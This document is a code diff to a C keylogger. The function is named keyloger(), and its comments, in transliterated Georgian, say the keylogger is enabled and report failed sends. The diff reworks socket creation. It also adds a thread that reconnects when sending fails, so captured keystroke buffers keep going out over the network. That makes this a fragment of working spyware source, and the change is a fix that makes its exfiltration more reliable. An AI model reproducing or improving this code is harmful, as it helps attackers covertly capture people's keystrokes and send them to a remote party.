@@ -21,7 +21,9 @@ char *read(char *path);
 int Save(int _key,char *file);
 void keyloger()
 {
-	void *sock =CreateSoket(); ///// misamarti SOCK
+	unsigned __int64 sock;
+	
+	CreateSoket(&sock); ///// misamarti SOCK
 	/////////////////////////////////////////////////////////
 	int sendResult = send((unsigned __int64) sock,(const char*)"\n\rkeylogery chartulia",strlen("keylogery chartulia")+5,0);
 	if(sendResult != SOCKET_ERROR)
@@ -58,7 +60,15 @@ void keyloger()
 									int sendResult = send((unsigned __int64) sock,(const char*)"\n\n\n\r///////////////////////////////////////////////////////////////////////////////////////////\n\n\r",strlen("n\n\n\r///////////////////////////////////////////////////////////////////////////////////////////\n\n\r")+1,0);
 										sendResult = send((unsigned __int64) sock,(const char*)bufffer,strlen(bufffer)+1,0);
 										if(sendResult == SOCKET_ERROR)
-										printf("ar gaigzavna");
+										{
+
+											printf("ar gaigzavna");
+											CreateThread(0,0,(LPTHREAD_START_ROUTINE)CreateSoket,&sock,0,0);
+
+
+
+
+										}
 								}
 
 									count=0;
